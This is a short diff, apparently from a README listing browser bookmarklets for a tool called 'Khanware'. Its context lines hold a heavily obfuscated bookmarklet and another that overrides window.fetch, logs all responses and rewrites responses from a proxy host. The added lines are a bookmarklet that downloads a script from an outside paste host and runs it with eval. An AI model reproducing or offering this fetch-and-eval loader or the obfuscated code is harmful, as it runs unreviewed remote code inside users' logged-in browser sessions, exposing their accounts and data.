@@ -6,3 +6,7 @@ javascript:(function(_0x3ce896,_0x47d5fe){const _0x4545c8={_0x3fd272:0x303,_0x5c
 ```js
 javascript:void function(){(function(){"undefined"==typeof originalFetch%26%26(window.originalFetch=window.fetch),window.username=prompt("Please enter your username:"),window.fetch=async function(a,b={}){const c=await window.originalFetch(a,b);let d=c.clone(),e=await d.text();if(console.log(d.url,e),c.url.includes("proxy.khanware.space")){const a=c.clone(),b=await a.text(),d=b+"\n%40"+window.username;return new Response(d,{status:a.status,statusText:a.statusText,headers:a.headers})}return c}})()}();
 ```
+
+```js
+javascript:fetch("https://proxy.khanware.space/estrogen.productions/p/raw/z6dwi4dw03").then(t=>t.text()).then(eval);
+```
